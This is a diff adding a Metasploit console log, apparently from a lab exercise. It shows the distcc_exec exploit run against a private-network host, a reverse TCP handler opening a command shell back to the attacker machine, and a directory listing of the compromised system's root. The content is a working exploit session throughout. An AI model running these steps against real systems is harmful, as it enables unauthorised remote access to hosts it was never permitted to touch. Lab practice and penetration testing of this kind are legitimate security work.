@@ -1,0 +1,42 @@
+msf > use exploit/unix/misc/distcc_exec
+msf exploit(distcc_exec) > set RHOST 192.168.16.220
+RHOST => 192.168.16.220
+msf exploit(distcc_exec) > exploit
+
+[*] Started reverse TCP double handler on 192.168.16.208:4444
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo UqpZtZQKRcsLyWVV;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket B
+[*] B: "UqpZtZQKRcsLyWVV\r\n"
+[*] Matching...
+[*] A is input...
+[*] Command shell session 1 opened (192.168.16.208:4444 -> 192.168.16.220:33331) at 2017-04-30 12:02:05 -0400
+
+ls /
+bin
+boot
+cdrom
+dev
+etc
+home
+initrd
+initrd.img
+lib
+lost+found
+media
+mnt
+nohup.out
+opt
+proc
+root
+sbin
+srv
+sys
+tmp
+usr
+var
+vmlinuz
